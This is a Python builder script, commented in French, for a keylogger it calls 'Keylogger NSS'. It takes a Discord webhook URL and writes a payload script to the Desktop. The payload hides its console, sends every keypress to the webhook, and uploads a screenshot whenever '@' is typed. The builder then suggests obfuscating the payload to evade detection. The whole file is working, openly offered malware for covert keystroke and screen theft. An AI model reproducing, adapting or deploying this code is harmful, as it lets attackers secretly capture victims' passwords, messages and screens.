import os
import requests
import ctypes
import cv2
import numpy as np
from PIL import ImageGrab
import keyboard
import time
import fade

def clear_screen():
 
    os.system('cls' if os.name == 'nt' else 'clear')

def prompt_webhook():
    clear_screen()
    print("Vous êtes de retour au programme.")
    

    text = fade.greenblue(""",---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
| ~ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | [ | ] | <-    |
|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
| ->| | " | , | . | P | Y | F | G | C | R | L | / | = |  \  |
|-----',--',--',--',--',--',--',--',--',--',--',--'-----|
| Caps | A | O | E | U | I | D | H | T | N | S | - |  Enter |
|------'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--------|
|        | ; | Q | J | K | X | B | M | W | V | Z |          |
|------,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|
| ctrl |  | alt |       Keylogger NSS      | alt  |  | ctrl |
'------'  '-----'--------------------------'------'  '------'""")
    print(text)

   
    webhook_url = input("Entrez l'URL du webhook Discord : ").strip()


    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        print("URL du webhook non valide.")
        input("Appuyez sur Entrée pour réessayer.")
        return prompt_webhook()  

    return webhook_url

def generate_script(webhook_url):

    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    filename = "keylogger_script.py"
    file_path = os.path.join(desktop, filename)

   
    script_code = f"""
import ctypes
import requests
import cv2
import numpy as np
from PIL import ImageGrab
import keyboard
import time

def capture_screenshot(webhook_url):
    try:
        screenshot = ImageGrab.grab()
        screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        _, img_encoded = cv2.imencode('.png', screenshot)
        response = requests.post(
            webhook_url,
            files={{"file": ("screenshot.png", img_encoded.tobytes(), "image/png")}},
            data={{"content": "Capture d'écran prise."}}
        )
        if response.status_code != 204:
            print(f"Erreur lors de l'envoi de la capture d'écran. Code HTTP : {{response.status_code}}")
    except Exception as e:
        print(f"Erreur lors de la capture d'écran : {{e}}")

def on_key_press(event):
    try:
        response = requests.post(
            webhook_url,
            json={{"content": f"Key Pressed : {{event.name}}"}} 
        )
        if response.status_code != 204:
            print(f"Erreur lors de l'envoi de la touche. Code HTTP : {{response.status_code}}")
    except Exception as e:
        print(f"Erreur lors de l'envoi des frappes de touches : {{e}}")

    if event.name == "@":
        capture_screenshot(webhook_url)

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        print(f"Erreur lors de la tentative de masquage de la console : {{e}}")

webhook_url = "{webhook_url}"

hide_console()

keyboard.on_press(on_key_press)

print("Le programme est en cours d'exécution.")

while True:
    time.sleep(1)  
"""

    # Écriture du script sur le bureau
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(script_code)

    print(f"Le script a été créé et sauvegardé sur le bureau sous le nom '{filename}'.")

def main():
    webhook_url = prompt_webhook()
    if webhook_url:
        generate_script(webhook_url)
        print("Vous pouvez l'obfusquer pour qu'il ne soit pas détecté.")
        input("Appuyez sur Entrée pour quitter le programme.")
        clear_screen()  # Efface l'écran avant de quitter

# Lancement du programme principal
main()
